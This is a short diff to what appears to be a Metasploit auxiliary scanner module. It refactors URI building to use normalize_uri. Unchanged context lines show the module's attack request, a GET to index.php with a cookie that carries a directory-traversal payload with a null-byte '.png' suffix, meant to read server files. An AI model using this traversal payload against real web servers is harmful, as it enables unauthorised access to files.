@@ -45,8 +45,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run_host(ip)
-		base = target_uri.path
-		base << '/' if base[-1,1] != '/'
+		base = normalize_uri(target_uri.path)
 
 		peer = "#{ip}:#{rport}"
 
@@ -58,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		res = send_request_cgi({
 			'method' => 'GET',
-			'uri'    => "#{base}index.php",
+			'uri'    => normalize_uri(base, "index.php"),
 			'cookie' => "blah=blah; cs_lang=#{traverse}#{f}%00.png"
 		})
 
